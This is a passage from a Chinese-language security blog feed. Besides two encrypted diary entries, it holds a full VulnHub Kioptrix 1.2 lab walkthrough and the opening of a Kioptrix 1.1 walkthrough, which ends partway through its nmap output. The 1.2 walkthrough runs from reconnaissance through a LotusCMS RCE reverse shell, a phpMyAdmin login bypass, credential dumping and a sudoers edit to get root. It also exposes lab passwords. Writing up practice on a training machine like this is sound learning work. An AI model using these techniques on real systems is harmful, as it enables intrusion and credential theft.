        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="不正确，再试一次～" data-whm="Oh, these decrypted content cannot be verified, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="075ccf1543005f7453a6b60f38722a7a42766389e9a0ec744823689d17a79416">8c76022e97a58cf7bdb38a6c611ba5afe6d77c112047be7c42efabbb76a9fb8dbe94d7f737c5cd469505c4a4f08a7b6f667c2bcc7e8bcc1101e50b7049df7119ef282aa8ae99dbbb8171861bcfb1b1dddc1d6384602f77af8ed62b7441ca57a8a2310eb6a37d7ea9c178724cb1e86e84df4fda9aaf10ed03e76ef92f0644b615f52ca4e2c8bf4051f2818e0afe618fd552766300d8d61e95c00f98538f6082f41c0f65fe2529d35367bc9caec7c3f8fbd659f03b984237ffc6e60f7b7a81d3835d63ab3965182ed1f33123241da04f6cee3218fd6d2cc3064bb011503840a750f6c16d0e639cd66ad7b4a8ca22420bda45d991c6a4663b4fab83d6e665abd1bee27bde2881f5ba87bcb1cea799e1d831d3fb196e27939eaae30aa831edfb244b4c9e6c06824c8e5583fc441df06c7685f11d72f539630e5e55fbc88872c0e5807c64fc6ce12e6bb7967b35d9c291f510309c1a96c3b18b4cdf94f77883556b866253734d276b26686b94938b711c8eead1bb8a53fdac73b34f6eaadeccec954979a7b5bd5f0e1c0c5ffc58cf88a44a409991cfa824f146c75d1bb748903094f6c2b09a66339b3af423cf82bc30134a5af43c34422354661e31d237384f65819f11a17fb661b6d07dc3409eb05bcd7034018b484add8742729dd27bac4ea54dc0d1005f99935da83595a2c386daf1641e15030ea4749d04d2708939e1362c27297e76191ae7ebf7d85b36ee5e0188e70be084c62b17cd1281b1cea02ed5d0aa51f662f2e63ba398a5db86c4740bf5823f0ba677344ffbd33ebf168114256691fe28be77a66b97c6f4e0a4981cb38aa31862dcf0c0fe27ad12a69f4d7d0606a9981d5332acc0ebaa378b93ea65776f1871e3f62c9ee3bae2c10d1fe18259147c4321dd8e433323f5484c2fc9ec15cb06674acdce4e270158d1969b7fa82d68a4b06f9198d197e731f32ccef9b8b87c5c61e4c392fb4c9bf69809b56b28cfc198b54b4727a7205b02e038a69e87f9cd58914416ccfa956d4c36f08f908dc42d21138e095fa8d0e7ddc6a6bcce77887f450dec1c83ad2c3862c3bfb20c9587d5db37870ee4f97fbd7f515a3497904c1ffe0b48bdce0bd6877856e179af67c5f7a911988fc164c9ea9eb6c2c174bf3f3729c286dde9b4f6cfc7cf858d98266908aecc6ee4e2f65c831f5269bc99e29da01155fd44e72277355314c08ea10fe399d1d799ee82d7b2555871041a4125cebe0c480eec28b74804cb9799aa9acd4a10b47100ef750748387c71013e894f905b4fb43f0adffa316e6ad05db7fa5a174b86f3433b8dfb0122aac8884be1eb16a294cce62ec0bfa4a8d0001988a56d8e2673f8b2406ff343d2c46c12d667db16ceb6146fae3d1a8c56f678a27b034aff048924475e0fd54291c1e8bcaf5ab898b0314305543e55893ed782f50c1b489af0a3ede018ded8204c5743aa6630b7dd39bc4d31b4629f1a4a8d05c1f532a1234f885ce6e16ee6959a18b6cec92d9cb47698a61b9bda2c11fd6214105713d50f904a8f86cbb25cf3cec6aea845ca35d05c1f37abeb639e9a580ceae77a98480b32da28e79198f8192420d143adce3e0ae57483022f57045b2544d5aea7540d6595e143f9479f04d864f5d22faf0f5d696bac1ac270b0105993f53e73648e9f665bf4586290ef2ad01de44469986638817ea4471ffa22da9dd5c08cfb451dc13b274d7730af8d5481375fc5d92fd11aedb694827339481a905104ac9e577b02bd457999dde5c6bd2e723f3132ddbb3831027a87650a7ed81e6e3939063e34e75068d3c3119c104a0230555e68bc41c83416bc43d9ba117fbdc3e21a4b1d4c1bb6519ceaa89f93a3a717cb6f209681a1f9ee0df345603ec85e20a879bd638e1f55f02c253861cd873de5239c52ad5512adf59f0b167be996427af8341174bba68a6e6a4c1b3b483b76d83011ba9542b1dae9ed1edd98f5709dfcb53f3919ef948bf26e6af3fc5f81b1459e757d7360baa85ca34a9d7fdf67fcab45f1d02e86fbb96278b2d80959f8ca68f3ced2da29d2edc804fccf082268c0ea06413a91b8719e0d2b8b3013e56edcb44a8871a7e4e96d89fd02818a00aac38b3d84ca46eaeb028a82b2a7a82431881037945a9ad936d4bc610e0d9fa28a8285bf96a950d4b83682aba42864c2a9102518372ca6e27a13a0d0cb160ec49b6bd1dfaa0459a9a6f10eec050ce9c50c464ae2187723eec05534a351e27e8c572cb0c0767f153cd27f2a197a27551ef5f033df3d99275f03467f2f4527ecfd40c71b192a69f9ce15f3e28adcd0b5cadbda0cc1cd5f7c64a9cd0399106a661cfda31fb9c1921e731f828b0760af686fce696bc6152a5f5d293db1de5523154cabe986aba79451cdc4d43dca9a8f872ddad9a5c4425c38534c3f4c759c8ae57fe1e81c17117ad66e8f739144b3af96d0c012f9773dfc99a5f3074f714662fb15b0da5969f3034aa986b245e222477948ff75d0bf2ee3fb091c30669a2125aebec21b1504d3924f47533d10bb4f1218dcb63154b14f576590dd7baef797a75175618e815a1f2a240d926185c1cf43c183dd29b6aaa9e65a737901c1e13cadfe3f6bd12302672c67dbce8475b58e6380b90fbe50b431efd14052158f85d5f9d0b8c35e55797683ff8120590ba93d79d52cff3a13139972f20a448b8b21cd781578ddd058d7277e271bb656d2bd382efda2c2c793ef244e7fba6a69887a2c8806b9e43f970e3411c07e7792c5033dac2246b3cc7924a0ea847bcf36bb49ce25c7f9a5b39a48c8dc0f90b429b79f227a98b089e854ecb74d1a6e835fbda48732d2cabc49a8f9d3e4eb4f6b0c79c2a879403c875ff8fe557b71fb386427876d7932ec1bbe37edd1111849cf79177cd491cf692652e6636b3824ce3efb204ee60b77fc2c5a8c8be40c5774900a3174e880e1e89beb01d0dfb27554438dc3a8e2b8301a64026737f68c79ecb135eae96cf2edfbac2f2584bdf9a86100a08a7b2e98581a21941bbbc04f23928a99980ebff588962099a09254c0ec8a60c632606967c13c33a4d604937b49673c10d75628b9292b1cccb4df00fc26946939148fa816f1be67bfc95a60964574ccb6d7f62884350a8c767fe0ab63be3a591d20af5a6127a45c0b21708d3d385e8627480d793deecf64b37eea098aab115a4d4887c872c0a6e4240017e6f10caf36c9cb26ce363fa615124153035452af4cde81afd4e1dd973088193af7f4e3230aec10aab9f56ff0408253fb3970435fb4d43b65882ec3bc3396379fc480f6fd35c582d676eba64995759d75d7e57208b80f18695b385306fe72aa77288efad716192fd5e315d502d779ba18978fe5774fb67649ac1d256110f138d0f583ea05a95a03dcf05c4fe229c46fc353f6f0f9ac9fa2d4f06b3ace5d20d08e19639c078e25b4de57ead0c6fb0840ba997c98600e8bc799576fe48eb40fd6f0e116ba1e80c78841565ec1eb17977d3369e35cdd6f41d2533e470b823e0afa28546d9043dde92ee65579bab0f5b148826f917e1959fc40cf09651c345d5200eae2efef32417e63ea66784197f889765ba9d5813db9b2c3174557d3125c25295515671a4faee0970ca4a47e749a6ef45ae98ca524789a23ee96673f4ec2e9ad33fe60f76366bb568049a2c3c5afe12ba3f3a19990b1b8dd52b6d7b4a8f5137fee385f697ce280711712a5e51f0f060390d65a04f56242ce8bcc6c8599512a22afa59e66fb616898105b6f2ca8868f83454b6f2e5e971f90dc15d4e45909b1857164331f798da4deeda490b7aa4605e726214020e229b6aa3f401dce514ad8c2153457878d190f24bbf3885bc898b80bac5a356f07d37a28ab44</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-swup-reload-script src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> Mad1sun的生活小日记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Mad1sun_bad_days</title>
      <link href="/2024/02/29/Mad1sun-bad-days/"/>
      <url>/2024/02/29/Mad1sun-bad-days/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="不正确，再试一次～" data-whm="Oh, these decrypted content cannot be verified, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="38e0b744c166c42bafc82fbb60a28f502fcbe76f1b47d8c14a91936c7530d523">8c76022e97a58cf7bdb38a6c611ba5afe6d77c112047be7c42efabbb76a9fb8daeae4b6ca3ddbfd01ec051499d4b50f2d43a75fc586274852cb871e33d21bf4379b6e540a918d6d3898b90acb267cfb0ddf5d64f1ee868313bdc4b97bf3d931dec88407482e7e9be8213f445488ddb3c64a5abb3900b55e21520c4210cc93c206815002449a7fbc7b0009219b65730859170cf5115e41eaf416af24e7dd41c5eb763d76b810b52c82192d44c6136bf9875c6187f53f31ced3e97e06e54ed6a1c2012ab39916707500105ec43c703a60673a17e9c85244b01e93fab8a9d5a843dbc30325250cbe69299f6c47ea651530c0103fa7b114102889a969743508ad1ab59bb99b1752ec66ca9274f0f31e09564b2c7a8a799fa953c9006fa8f8c87f53428097f9a93ff9f44b48a48b2f4dea2b5dca2db228564700a77af39853e9e3038e0cfc0a05dd7616eaee5cc49ba9d59e91a9db21d3e460e620b0e68717157dfc4a3467451810fac4776ef433560454ec5ac582e1b05ada5b3e6f0a35dc836a08463482d980762ca1207f164f1942c8e797823ddadab5e5bfdc09089d383616e467a935978e86cb26b25df7f3aab4dd221ec829f412aa584b672635631233f500bd45f2d61e7885cc5fba1fcb63d4b30e298201be459858fa078a72629beaa750e</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-swup-reload-script src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> Mad1sun的生活小日记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mad1sun倒霉蛋的日常 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kioptrix Level 1.2(#3)</title>
      <link href="/2024/02/11/Kioptrix_Level_1.2/"/>
      <url>/2024/02/11/Kioptrix_Level_1.2/</url>
      
        <content type="html"><![CDATA[<h1 id="Kioptrix-Level-1-2-3"><a href="#Kioptrix-Level-1-2-3" class="headerlink" title="Kioptrix Level 1.2(#3)"></a>Kioptrix Level 1.2(#3)</h1><h2 id="渗透思路"><a href="#渗透思路" class="headerlink" title="渗透思路"></a>渗透思路</h2><h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><ul><li>nmap扫描ip，得到IP为<code>192.168.89.139</code></li><li>nmap扫描端口以及端口服务</li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-11 00:12 EST</span><br><span class="line">Nmap scan report for 192.168.89.139</span><br><span class="line">Host is up (0.0025s latency).</span><br><span class="line">Not shown: 65533 closed tcp ports (conn-refused)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)</span><br><span class="line">80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 12.49 seconds</span><br></pre></td></tr></table></figure></div><p>发现开放了ssh和http服务</p><ul><li>浏览器访问<code>http://192.168.89.139</code></li></ul><img lazyload src="/images/loading.svg" data-src="Kioptrix_Level_1.2/截屏2024-02-13_下午8.24.57.png" alt="截屏2024-02-13_下午8.24.57" style="zoom:67%;"><ul><li>点击Login，发现一个登录界面，<code>Proudly Powered by:LotusCMS</code>，<strong>LotusCMS</strong>是关键，CMS（Content  Management System 内容管理系统）</li></ul><p><img lazyload src="/images/loading.svg" data-src="./%E6%88%AA%E5%B1%8F2024-02-13_%E4%B8%8B%E5%8D%888.25.32.png" alt="截屏2024-02-13_下午8.25.32"></p><p><em>看到登录框，想起上一道题，可能存在sql注入</em></p><ul><li>dirsearch扫描网址：<code>dirsearch --url http://192.168.89.139</code></li></ul><p><img lazyload src="/images/loading.svg" data-src="./%E6%88%AA%E5%B1%8F2024-02-13_%E4%B8%8B%E5%8D%888.36.19.png" alt="截屏2024-02-13_下午8.36.19"></p><p><strong>发现了一个phpmyadmin，还有一个gallery</strong></p><ul><li>查看<code>http://192.168.89.139/phpmyadmin/</code>，<strong>需要拿到root密码</strong></li></ul><p><img lazyload src="/images/loading.svg" data-src="./%E6%88%AA%E5%B1%8F2024-02-13_%E4%B8%8B%E5%8D%889.57.06.png" alt="截屏2024-02-13_下午9.57.06"></p><p>*由之前信息收集阶段的结果可知 phpmyadmin 的版本为 <strong>2.11.3</strong>，搜索可知该版本存在”万能密码”,使用 <strong>‘localhost’@‘@”</strong> 即可登陆，但是只有一个 <strong>information_schema</strong> ，没什么用*</p><blockquote><p><a class="link" href="https://bulletforkiller.github.io/post/2020-07-31-vulnhub-kioptrixvm3/#lotuscms">Vulnhub-KioptrixVM3 - Josephine’s Blog (bulletforkiller.github.io) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p></blockquote><ul><li>查看<code>http://192.168.89.139/gallery/</code>，dirsearch扫一下目录</li></ul><p><img lazyload src="/images/loading.svg" data-src="./%E6%88%AA%E5%B1%8F2024-02-13_%E4%B8%8B%E5%8D%888.58.54.png" alt="截屏2024-02-13_下午8.58.54"></p><ul><li>发现了一个后台/gallery/gadmin，<strong>Username为admin</strong>，一个db.sql文件<img lazyload src="/images/loading.svg" data-src="./%E6%88%AA%E5%B1%8F2024-02-13_%E4%B8%8B%E5%8D%889.00.18.png" alt="截屏2024-02-13_下午9.00.18"></li></ul><p><strong>后台可以尝试sql注入</strong></p><p><strong>db.sql部分文件内容如下：</strong></p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE IF NOT EXISTS `gallarific_users` (</span><br><span class="line">  `userid` int(11) NOT NULL auto_increment,</span><br><span class="line">  `username` varchar(100) NOT NULL default &#x27;&#x27;,</span><br><span class="line">  `password` varchar(100) NOT NULL default &#x27;&#x27;,</span><br><span class="line">  `usertype` enum(&#x27;superuser&#x27;,&#x27;normaluser&#x27;) NOT NULL default &#x27;superuser&#x27;,</span><br><span class="line">  `firstname` varchar(100) NOT NULL default &#x27;&#x27;,</span><br><span class="line">  `lastname` varchar(100) NOT NULL default &#x27;&#x27;,</span><br><span class="line">  `email` varchar(255) NOT NULL default &#x27;&#x27;,</span><br><span class="line">  `datejoined` int(11) NOT NULL default &#x27;0&#x27;,</span><br><span class="line">  `website` varchar(255) NOT NULL default &#x27;&#x27;,</span><br><span class="line">  `issuperuser` tinyint(4) NOT NULL default &#x27;0&#x27;,</span><br><span class="line">  `photo` varchar(100) NOT NULL default &#x27;&#x27;,</span><br><span class="line">  `joincode` varchar(20) NOT NULL default &#x27;&#x27;,</span><br><span class="line">  PRIMARY KEY  (`userid`)</span><br><span class="line">);</span><br></pre></td></tr></table></figure></div><h4 id="总结突破方向——cms-web"><a href="#总结突破方向——cms-web" class="headerlink" title="总结突破方向——cms+web"></a>总结突破方向——cms+web</h4><ul><li><p>Login是否存在sql注入</p></li><li><p>LotusCMS 是否存在可利用的漏洞</p></li><li><p>是否能拿到phpmyadmin后台的root用户密码，查看数据库信息</p></li><li><p>/gallery/gadmin是否存在sql注入</p></li></ul><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><h4 id="lotusCMS漏洞利用"><a href="#lotusCMS漏洞利用" class="headerlink" title="lotusCMS漏洞利用"></a>lotusCMS漏洞利用</h4><ul><li><p>在github中找到python利用的lotuscms3.0RCE漏洞：<a class="link" href="https://github.com/nguyen-ngo/LotusCMS-3.0-RCE-exploit">https://github.com/nguyen-ngo/LotusCMS-3.0-RCE-exploit <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p></li><li><p>nc监听444端口:<code> nc -nvlp 444</code>，同时执行<code> python lotuscms.py -rh 192.168.89.139 -lh 192.168.89.137</code></p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-h, --help  show this help message and exit.</span><br><span class="line">-rh RHOST   Target Host.</span><br><span class="line">-rp RPORT   Target Port. Default: 80.</span><br><span class="line">-u URI      URI (i.e /lms/. Default: /</span><br><span class="line">-lh LHOST   Local Host.</span><br><span class="line">-lp LPORT   Local Port. Default: 444</span><br><span class="line">-s          SSL/TLS enable (True/False). Default: False</span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="./image-20240229153523165.png" alt="image-20240229153523165"></p><p><strong>成功拿到www-data，但是这只是一个普通用户权限，由于我们扫出了重要的网站后台，先利用这个用户权限，查看网站源文件，看是否存在敏感信息</strong></p></li><li><p>通过www-data，我们可以查看/etc/passwd /etc/shadow，这些信息，<em>里面能看到后面能查到的dreg和loneferret两个用户</em></p></li><li><p>在网页根目录中查找敏感信息，通过<code>cat gconfig.php</code>成功看到mysql的username和password，可以直接登录phpmyadmin了</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$GLOBALS[&quot;gallarific_mysql_server&quot;] = &quot;localhost&quot;;</span><br><span class="line">$GLOBALS[&quot;gallarific_mysql_database&quot;] = &quot;gallery&quot;;</span><br><span class="line">$GLOBALS[&quot;gallarific_mysql_username&quot;] = &quot;root&quot;;</span><br><span class="line">$GLOBALS[&quot;gallarific_mysql_password&quot;] = &quot;fuckeyou&quot;;</span><br></pre></td></tr></table></figure></div></li><li><p>拿到phpmyadmin后台root密码后，登录后台，看到一些<strong>数据库信息</strong></p></li></ul><p><img lazyload src="/images/loading.svg" data-src="./%E6%88%AA%E5%B1%8F2024-02-13_%E4%B8%8B%E5%8D%888.34.41.png" alt="截屏2024-02-13_下午8.34.41"></p><ul><li>可以看到我们要找的gallery数据库，gallarific_users这张表，也就是gallery/gadmin后台的登录用户名和密码</li></ul><p><img lazyload src="/images/loading.svg" data-src="./%E6%88%AA%E5%B1%8F2024-02-13_%E4%B8%8B%E5%8D%889.15.57.png" alt="截屏2024-02-13_下午9.15.57"></p><p><strong>拿到password <code>n0t7t1k4</code></strong></p><p>利用<code>admin </code>和<code>n0t7t1k4</code>登录网站后台gallery/gadmin，但是发现网站里面，没有什么特别的东西，<em>其实可以看到一些上传功能和评论功能，可以试试，这里不赘述。</em></p><ul><li>继续翻找phpmyadmin，发现了一个叫做dev_accounts的表，里面存了username和password，这两个用户我们在之前通过www-data，查看用户列表时看到过，因此如果破解了密码可以利用<code>ssh</code>登录</li></ul><p><img lazyload src="/images/loading.svg" data-src="./image-20240229194301766.png" alt="image-20240229194301766"></p><ul><li>通过<code>md5</code>解密，得到账户信息 [md5在线解密](<a class="link" href="https://www.cmd5.com/default.aspx?hashtype=md5&answer=cWluZ21pbmcxMTI0MTUu">md5在线解密破解,md5解密加密 (cmd5.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>)</li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dreg Mast3r</span><br><span class="line">loneferret starwars</span><br></pre></td></tr></table></figure></div><p><em>看到别人的walkthrough发现这里也可以hydra爆破，详情请看  <a class="link" href="https://bulletforkiller.github.io/post/2020-07-31-vulnhub-kioptrixvm3/#phpmyadmin">Vulnhub-KioptrixVM3 - Josephine’s Blog (bulletforkiller.github.io) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></em></p><ul><li>目标主机开了ssh服务，尝试利用ssh登录</li></ul><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh -o KexAlgorithms=diffie-hellman-group14-sha1 -oHostKeyAlgorithms=+ssh-dss dreg@192.168.89.139</span><br><span class="line">ssh -o KexAlgorithms=diffie-hellman-group14-sha1 -oHostKeyAlgorithms=+ssh-dss loneferret@192.168.89.139</span><br></pre></td></tr></table></figure></div><p><em>直接ssh，会导致报错，原因大概是对方使用的ssh版本比较低，详情请看<a class="link" href="https://askubuntu.com/questions/836048/ssh-returns-no-matching-host-key-type-found-their-offer-ssh-dss">SSH 返回：未找到匹配的主机密钥类型。他们的报价：ssh-dss - 询问 Ubuntu (askubuntu.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></em></p><h4 id="简单查看两个用户的权限"><a href="#简单查看两个用户的权限" class="headerlink" title="简单查看两个用户的权限"></a>简单查看两个用户的权限</h4><ul><li><code>sudo -l</code> 查看当前用户有哪些被sudo服务授权的命令，<strong>可以发现loneferret下ht和su</strong></li></ul><p><img lazyload src="/images/loading.svg" data-src="./image-20240229202721535.png" alt="image-20240229202721535"></p><p><em>按理说，我们直接<code>sudo su root</code>就可以直接切换成root，但是发现su的路径貌似写错了，正确的应该是<code>/bin/su</code></em></p><p><img lazyload src="/images/loading.svg" data-src="./Screenshot2024-02-29_21.03.16.png" alt="Screenshot2024-02-29_21.03.16"></p><h5 id="提权思路"><a href="#提权思路" class="headerlink" title="提权思路"></a>提权思路</h5><ul><li><p>利用内核信息提权</p></li><li><p>SUID提权：直接利用<code>sudo ht</code>编辑<code>/etc/sudoers</code>文件提权</p></li></ul><h3 id="权限提升-privilege-escalation"><a href="#权限提升-privilege-escalation" class="headerlink" title="权限提升 privilege escalation"></a>权限提升 privilege escalation</h3><h4 id="利用LES工具内核提权"><a href="#利用LES工具内核提权" class="headerlink" title="利用LES工具内核提权"></a>利用LES工具内核提权</h4><blockquote><p><a class="link" href="https://github.com/The-Z-Labs/linux-exploit-suggester">The-Z-Labs/linux-exploit-suggester：Linux 权限升级审计工具 (github.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p>LES 工具旨在帮助检测给定 Linux 内核/基于 Linux 的机器的安全缺陷。</p></blockquote><ul><li>利用les工具，查看系统是否有漏洞</li></ul><p><img lazyload src="/images/loading.svg" data-src="./image-20240229161417872.png" alt="image-20240229161417872"></p><ul><li><p>先通过<code>uname -a</code>查看系统信息：</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Linux Kioptrix3 2.6.24-24-server #1 SMP Tue Jul 7 20:21:17 UTC 2009 i686 GNU /Linux  </span><br></pre></td></tr></table></figure></div></li><li><p>在kali中<code>bash ./les.sh --uname &quot;Linux Kioptrix3 2.6.24-24-server #1 SMP Tue Jul 7 20:21:17 UTC 2009 i686 GNU/Linux&quot;</code></p></li></ul><p><img lazyload src="/images/loading.svg" data-src="./image-20240229162455063.png" alt="image-20240229162455063"></p><ul><li>发现可以直接用脏牛，但具体没实现出来，因为两个用户都有很多权限限制<ul><li>可以利用msf中的后渗透meterpreter上传，<em>但由于oscp限制msf的使用，这里不叙述，感兴趣的可以查看这篇文章的内核提权部分 <a class="link" href="https://bulletforkiller.github.io/post/2020-07-31-vulnhub-kioptrixvm3/#phpmyadmin">Vulnhub-KioptrixVM3 - Josephine’s Blog (bulletforkiller.github.io) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></em></li></ul></li></ul><h4 id="SUID提权"><a href="#SUID提权" class="headerlink" title="SUID提权"></a>SUID提权</h4><blockquote><p>关于SUID提权的介绍与总结：<a class="link" href="https://cloud.tencent.com/developer/article/1878212">对Linux—suid提权的一些总结-腾讯云开发者社区-腾讯云 (tencent.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p></blockquote><ul><li>查看ht是否具有suid，<code>ls -al /usr/local/bin/ht</code>，发现rws，s表示具有suid，果然</li><li>直接<code>ht</code>，修改<code>/etc/sudoers</code>，添加<code>/bin/bash</code>或修改su的路径为<code>!/bin/su</code></li><li>这里我的kali很奇怪，直接ht里面修改会导致<strong>segmentation fault</strong>，只能通过<code>sudo ht /etc/sudoers</code>，而且得改二进制才行:sweat:，搞了很久🤮。最后直接把lonferret改成了ALL=（ALL）ALL</li></ul><p><img lazyload src="/images/loading.svg" data-src="./image-20240229221121593.png" alt="image-20240229221121593"></p><ul><li>然后就直接<code>sudo su root</code>，<strong>成功拿到root</strong></li></ul><p><img lazyload src="/images/loading.svg" data-src="./image-20240229221244697.png" alt="image-20240229221244697"></p><h2 id="参考列表"><a href="#参考列表" class="headerlink" title="参考列表"></a>参考列表</h2><blockquote><p><a class="link" href="https://bulletforkiller.github.io/post/2020-07-31-vulnhub-kioptrixvm3/#phpmyadmin">Vulnhub-KioptrixVM3 - Josephine’s Blog (bulletforkiller.github.io) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p></blockquote><blockquote><p><a class="link" href="https://www.cnblogs.com/wsec/p/vulhub0x03.html">0×03 Vulnhub 靶机渗透总结之 KIOPTRIX: LEVEL 1.2 (#3) SQL注入+sudo提权 - wsec - 博客园 (cnblogs.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p></blockquote><blockquote><p><a class="link" href="https://github.com/The-Z-Labs/linux-exploit-suggester">The-Z-Labs/linux-exploit-suggester：Linux 权限升级审计工具 (github.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p></blockquote><blockquote><p><a class="link" href="https://cloud.tencent.com/developer/article/1878212">对Linux—suid提权的一些总结-腾讯云开发者社区-腾讯云 (tencent.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 类OSCP靶机练习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kioptrix Level 1.1(#2)</title>
      <link href="/2024/02/03/Kioptrix_Level_1.1/"/>
      <url>/2024/02/03/Kioptrix_Level_1.1/</url>
      
        <content type="html"><![CDATA[<h1 id="Kioptrix-Level-1-1-2"><a href="#Kioptrix-Level-1-1-2" class="headerlink" title="Kioptrix Level 1.1(#2)"></a>Kioptrix Level 1.1(#2)</h1><blockquote><p>参考 <a class="link" href="https://hummus-ful.github.io/vulnhub/2021/01/25/Kioptrix_2.html">Kioptrix: Level 1.1 (#2) | Hacking Walkthroughs, Writeups and Guides (hummus-ful.github.io) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p></blockquote><h2 id="渗透思路"><a href="#渗透思路" class="headerlink" title="渗透思路"></a>渗透思路</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><ul><li>nmap扫描ip，得到IP为<code>192.168.89.138</code></li><li>nmap扫描端口及端口服务</li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-02 10:25 EST</span><br><span class="line">Nmap scan report for localhost (192.168.89.138)</span><br><span class="line">Host is up (0.00071s latency).</span><br><span class="line">Not shown: 65528 closed tcp ports (reset)</span><br><span class="line">PORT     STATE SERVICE  VERSION</span><br><span class="line">22/tcp   open  ssh      OpenSSH 3.9p1 (protocol 1.99)</span><br><span class="line">80/tcp   open  http     Apache httpd 2.0.52 ((CentOS))</span><br><span class="line">111/tcp  open  rpcbind  2 (RPC #100000)</span><br><span class="line">443/tcp  open  ssl/http Apache httpd 2.0.52 ((CentOS))</span><br><span class="line">605/tcp  open  status   1 (RPC #100024)</span><br><span class="line">631/tcp  open  ipp      CUPS 1.1</span><br><span class="line">3306/tcp open  mysql    MySQL (unauthorized)</span><br><span class="line">MAC Address: 00:50:56:39:80:A3 